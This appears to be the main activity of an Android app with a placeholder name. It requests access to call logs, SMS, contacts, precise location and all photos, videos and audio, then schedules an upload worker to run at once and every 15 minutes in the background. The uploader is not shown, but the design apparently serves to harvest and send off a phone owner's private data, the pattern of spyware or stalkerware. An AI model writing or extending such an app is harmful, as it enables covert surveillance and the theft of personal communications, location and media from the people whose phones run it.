package com.example.myapplication3

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.FirebaseApp
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize Firebase
        FirebaseApp.initializeApp(this)
        Log.d("MainActivity", "Firebase initialized.")

        // Check for permissions and request if necessary
        if (!hasAllPermissions()) {
            Log.d("MainActivity", "Requesting permissions.")
            requestAllPermissions()
        } else {
            Log.d("MainActivity", "All permissions granted.")
            scheduleUploadWorker()
            scheduleImmediateUploadWorker()
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun hasAllPermissions(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )

        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestAllPermissions() {
        val permissionsToRequest = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )

        ActivityCompat.requestPermissions(this, permissionsToRequest, REQUEST_ALL_PERMISSIONS)
    }

    // Handle the result of the permission request
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_ALL_PERMISSIONS) {
            for (i in permissions.indices) {
                val permission = permissions[i]
                val isGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED
                Log.d("MainActivity", "Permission: $permission, Granted: $isGranted")

                if (!isGranted) {
                    Log.e("MainActivity", "Permission denied: $permission")
                }
            }

            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Log.d("MainActivity", "All permissions granted, scheduling workers.")
                scheduleUploadWorker()
                scheduleImmediateUploadWorker()
            } else {
                Log.e("MainActivity", "Some permissions denied.")
            }
        }
    }

    private fun scheduleUploadWorker() {
        val workRequest = PeriodicWorkRequestBuilder<UploadWorker>(15, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueue(workRequest)
        Log.d("MainActivity", "Periodic upload worker scheduled.")
    }

    private fun scheduleImmediateUploadWorker() {
        val oneTimeWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
            .build()
        WorkManager.getInstance(this).enqueue(oneTimeWorkRequest)
        Log.d("MainActivity", "Immediate upload worker scheduled.")
    }

    companion object {
        private const val REQUEST_ALL_PERMISSIONS = 1001
    }
}
